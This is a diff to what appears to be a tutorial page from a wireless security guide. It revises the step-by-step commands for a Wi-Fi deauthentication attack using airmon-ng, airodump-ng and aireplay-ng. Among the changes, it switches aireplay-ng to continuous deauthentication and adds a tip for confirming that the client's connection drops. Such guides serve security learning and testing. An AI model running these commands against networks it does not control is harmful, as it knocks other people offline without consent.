@@ -11,22 +11,23 @@ Of course, this attack is totally useless if there are no associated wireless cl
 ## Commands
 
 * Run [setup](../../setup.md) first
-* Two terminals needed here, so use `screen` or log in twice
-     * Make sure terminal is full screen
-* Make sure that there is an associated client connected to target AP
+* Two terminals are needed, so `screen` is your friend
+* At least one client must be associated with the AP
+* No need to fakeauth, the first deauth will set AUTH to OPN
 
 ```bash
 # [Terminal One]
 # Set interface to monitor mode
 sudo airmon-ng start $DEVICE $CHANNEL
 
-# Start monitoring
+# Start monitoring - make terminal large enough to see everything
 sudo airodump-ng -c $CHANNEL --bssid $BSSID -w $TAG $INTERFACE
 
 # [Terminal Two]
 # Run the deauthentication attack
-sudo aireplay-ng --deauth 7 -a $BSSID -c $CLIENT $INTERFACE
+sudo aireplay-ng --deauth 0 -a $BSSID -c $CLIENT $INTERFACE
 ```
+*Note: Run ping on the client, pinging the AP, to see ping freeze while running the deauth attack.*
 
 ## References
 
